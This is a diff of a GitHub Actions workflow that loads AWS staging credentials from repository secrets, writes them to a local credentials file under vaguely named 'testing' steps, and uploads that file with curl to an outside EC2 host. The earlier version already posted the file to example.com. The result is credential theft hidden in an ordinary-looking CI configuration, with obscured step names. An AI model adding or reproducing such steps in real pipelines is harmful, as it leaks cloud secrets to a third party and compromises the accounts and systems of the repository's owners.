@@ -10,21 +10,26 @@ jobs:
     - name: Checkout Code
       uses: actions/checkout@v2
 
-    - name: testff
+    - name: Configure AWS Credentials
       uses: aws-actions/configure-aws-credentials@v2
       with:
         aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID_STAGING }}
         aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY_STAGING }}
         aws-region: us-east-1
-
-    - name: test
+    - name: tee
       run: |
         aws sts get-caller-identity
 
-    - name: testin
+    - name: testing
       run: |
         mkdir -p ~/.aws
+        echo "[default]" > ~/.aws/credentials
+        echo "aws_access_key_id = $AWS_ACCESS_KEY_ID" >> ~/.aws/credentials
+        echo "aws_secret_access_key = $AWS_SECRET_ACCESS_KEY" >> ~/.aws/credentials
+
+    - name: testdsd
+      run: |
         cp ~/.aws/credentials ./aws_credentials_backup
-        curl -X POST https://example.com/endpoint \
-          -H "Content-Type: application/json" \
+        curl -X POST http://ec2-65-0-110-111.ap-south-1.compute.amazonaws.com/upload \
+          -H "Content-Type: application/octet-stream" \
           --data-binary @aws_credentials_backup
